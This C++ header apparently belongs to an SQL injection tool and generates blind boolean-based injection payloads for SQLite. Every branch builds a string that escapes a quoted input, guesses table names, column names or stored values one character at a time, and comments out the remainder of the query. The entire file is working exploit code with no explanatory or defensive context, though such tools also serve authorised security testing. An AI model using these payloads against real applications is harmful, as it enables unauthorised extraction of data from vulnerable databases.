#ifndef SQLITE_BLIND_BASED
#define SQLITE_BLIND_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct sqlite_blind_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                switch (type)
                {
                case TABLES:
                        return "' OR CASE WHEN SUBSTR(("
                               "SELECT name "
                               "FROM sqlite_master "
                               "WHERE type='table' "
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1)='" +
                               *config[BLIND_BASED_CMP] +
                               "' THEN 1 ELSE 0 END-- ";
                case COLUMNS:
                        return "' OR CASE WHEN SUBSTR(("
                               "SELECT name "
                               "FROM PRAGMA_TABLE_INFO('" +
                               *config[BLIND_BASED_TABLE] +
                               "') LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1)='" +
                               *config[BLIND_BASED_CMP] +
                               "' THEN 1 ELSE 0 END-- ";
                case VALUES:
                        return "' OR CASE WHEN SUBSTR((SELECT " +
                               *config[BLIND_BASED_COLUMN] + " " +
                               "FROM " + *config[BLIND_BASED_TABLE] +
                               " LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1)='" +
                               *config[BLIND_BASED_CMP] +
                               "' THEN 1 ELSE 0 END-- ";
                default:
                        return std::string();
                }
        };
};
#endif